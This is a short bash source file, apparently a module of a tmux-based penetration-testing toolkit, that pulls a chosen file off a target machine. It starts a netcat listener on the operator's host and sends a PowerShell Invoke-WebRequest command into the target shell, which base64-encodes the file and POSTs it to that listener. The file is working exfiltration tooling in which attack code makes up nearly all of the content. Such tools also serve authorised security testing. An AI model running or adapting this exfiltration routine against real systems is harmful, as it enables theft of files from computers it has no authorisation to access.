#!/usr/bin/env bash


commander_run() {
  local pane_id="$1"
  local file_to_fetch="$(tmux command-prompt -p "Enter file to fetch: " "display-message -p '%%'")"
  local dst_file_b64="$(mktemp)"
  local dst_file="###SessionDir###Files/${file_to_fetch}"
  dst_file="$(penmux_module_expand_options_string "$_MODULE_PATH" "$dst_file" "$pane_id")"
  dst_file="$(penmux_expand_tmux_format_path "$pane_id" "$dst_file")"
  local dst_dir="$(dirname "$dst_file")"
  local lhost="$(penmux_module_get_option "$_MODULE_PATH" "LocalHost" "$pane_id")"
  local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"

  if [[ ! -d "$dst_dir" ]]; then
    mkdir -p "$dst_dir" || return
  fi

  tmux new-window -d "nc -w 10 -N -nlvp \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\""

  tmux send-keys "Invoke-WebRequest -uri http://$lhost:$lport/data.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"$file_to_fetch\")))" Enter
}
